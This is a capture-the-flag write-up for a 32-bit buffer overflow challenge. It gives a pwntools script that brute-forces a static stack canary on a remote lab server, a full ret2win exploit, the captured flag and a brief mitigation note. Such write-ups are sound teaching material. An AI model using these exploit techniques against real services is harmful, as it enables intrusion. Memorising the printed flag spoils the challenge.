## CTF: picoCTF 2022

Challenge: Buffer Overflow 3

Points:10

Category: pwn

Difficulty: Advanced

## Instructions

Do you think you can bypass the protection and get the flag?

## Solution

### Brute Force Canary

So for this challenge, it wasn't really hard, it was more simplistic then the GOT overwrite stuff, but did involve a little bit more thinking. You are given a program called vuln, we can do all our same baseline checks on the file to find what kind of file it is and the protections on it.

```bash
└─$ file vuln
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=bc6a27daf2d60435e3450648381fbf35fa9020b5, for GNU/Linux 3.2.0, not stripped

┌──(shinigami㉿shinigami)-[~/DrBrown]
└─$ checksec vuln
[*] '/home/shinigami/DrBrown/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

We see that it is a 32-bit executable, no canary, no PIE and NX is enabled. Remember, just because checksec didn't find a canary put in place by the compiler, doesn't mean the developer didn't put their own in. Actually when you try to run the file, it asks you to make a flag.txt and canary.txt, meaning we can assume whatever contents we put in our canary.txt will be shown to us. Lets try running it and see what happens.

```bash
└─$ ./vuln
How Many Bytes will You Write Into the Buffer?
> 2
Input> 22
Ok... Now Where's the Flag?
```

Very simple program, seems it lets us request a size, and then takes in some input. None of our input is echo'd back to the screen, so there's no way for us to simply leak the canary. It may seem like we're out of options, but we're in luck that this is a 32-bit executable. This means it is feasible for us to bruteforce the canary since it's just reading text from a static file. If this was a canary made at runtime, it would be impossible, but now we simply need to keep sending input until we succeed. Lets try to find what message we get when we overwrite the canary.

```bash
How Many Bytes will You Write Into the Buffer?
> 100
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
***** Stack Smashing Detected ***** : Canary Value Corrupt!
```

So we just need to look for any word in this message, if we don't see it then we must have succeeded. Final piece of information we need is how far is our input from the canary.

```bash
0xffffd140:	0xffffd1d8	0x0804c048	0x00000004	0x08049390
0xffffd150:	0x00000141	0x00000064	0x0a303031	0xf7f966e0
0xffffd160:	0xf7ffcfd4	0x00000000	0xf7dedcf9	0xf7f96e14
0xffffd170:	0x0804d1e0	0x00000000	0xffffd1b8	0xf7dde85b
0xffffd180:	0x0804d1e0	0x00000000	0x00000004	0x0804bff4
0xffffd190:	0x00000000	0x0804bff4	0x61616161	0x61616161
0xffffd1a0:	0x61616161	0x61616161	0x08040a61	0x0804bff4
0xffffd1b0:	0x00000000	0xf7ffcc60	0xffffd1e8	0x08049378
0xffffd1c0:	0x0804d1e0	0x00000001	0x00000004	0x0804d1e0
0xffffd1d0:	0x000003e8	0x0804bff4	0x64526942	0x00000003
0xffffd1e0:	0x000003e8	0x0804bff4	0xffffd208	0x08049510
0xffffd1f0:	0xf7fbc400	0x00000000	0x00000000	0x000003e8
0xffffd200:	0xffffd220	0xf7f96e14

```

We can see that our input starts at 0xffffd19c and our canary value is at 0xffffd1dc (the string there will depend on your personal canary value you put into canary.txt). That means we are 64 bytes away from the canary. Lets try to write an exploit for this.

```bash
canary = b""
count = 0
win_addr = 0x08049236
while(count < 4):
    for i in range(0x00,0x7f):
        #p = process()
        p = remote("xebec.cylabacademy.net",48518)
        payload = b"A" * 64 + canary + bytes(chr(i),"utf-8")
        p.sendline("84")
        p.send(payload)
        info = p.recvall()
        if("Smashing" in str(info)):
            continue
        else:
            canary += bytes(chr(i),"utf-8")
            count = count + 1
            break
```

So we make an empty canary, and set a count since the canary is most likely only 4 bytes. If we failed, we could just brute force more in retrospect but 4 bytes is a fairly reasonable guess. We put a while loop so we can loop through all four positions. We then put a for loop throughout the entire ASCII table range and send it. If we see "Smashing" in the info variable, we continue, else we have succeeded so add that to the canary variable, increase the count, and go to the next position. After running this exploit, we find the canary on the remote server is b"BiRd".

### Exploit

Now that we have the canary value, we can now finish exploiting the rest of the program. Doing an info func on the program in gdb, we see that there is a win function at 0x08049236. Now it's just a simple ret to win. We just have to find how far the saved return address is from the canary value. Looking at the dump above, it is about 16 bytes away. So our final payload would be 64 bytes + our canary + 16 bytes + the win address.

### Full Exploit

```bash
from pwn import *

elf = context.binary = ELF("./vuln")
canary = b""
count = 0
win_addr = 0x08049236
'''
while(count < 4):
    for i in range(0x00,0x7f):
        #p = process()
        p = remote("xebec.cylabacademy.net",48518)
        payload = b"A" * 64 + canary + bytes(chr(i),"utf-8")
        p.sendline("84")
        p.send(payload)
        info = p.recvall()
        if("Smashing" in str(info)):
            continue
        else:
            canary += bytes(chr(i),"utf-8")
            count = count + 1
            break
'''

#print(canary)
#p = process()
canary = b"BiRd"
p = remote("xebec.cylabacademy.net",48518)
payload = b"A" * 64  + canary + b"A" * 16 + p32(win_addr)
p.sendline("100")
p.send(payload)
print(p.recvline())
p.interactive()

```

## Flag

academy{Stat1C_c4n4r13s_4R3_b4D_77f0b53c}

## Mitigation

Don't use a static canary. This makes guessing the canary possible. Just use built in stack protections from the compiler.